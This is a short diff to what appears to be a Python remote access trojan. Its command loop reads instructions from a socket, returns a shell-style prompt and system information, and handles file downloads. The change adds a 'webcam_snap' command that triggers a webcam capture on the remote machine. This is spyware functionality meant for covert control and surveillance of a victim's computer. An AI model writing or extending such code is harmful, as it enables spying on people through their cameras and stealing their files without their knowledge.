@@ -76,6 +76,9 @@ def run():
             s.send(os.getcwd().encode() + os.getcwd().encode() + "> ".encode())
         elif cmd[:7] == "sysinfo":
             s.send(platform.platform().encode() + "\n".encode())
+        # Webcam Snapshot
+        elif cmd[:11] == "webcam_snap":
+            webcam_snap()
         # File download
         elif cmd[:8] == "download":
             filename = cmd[9:]
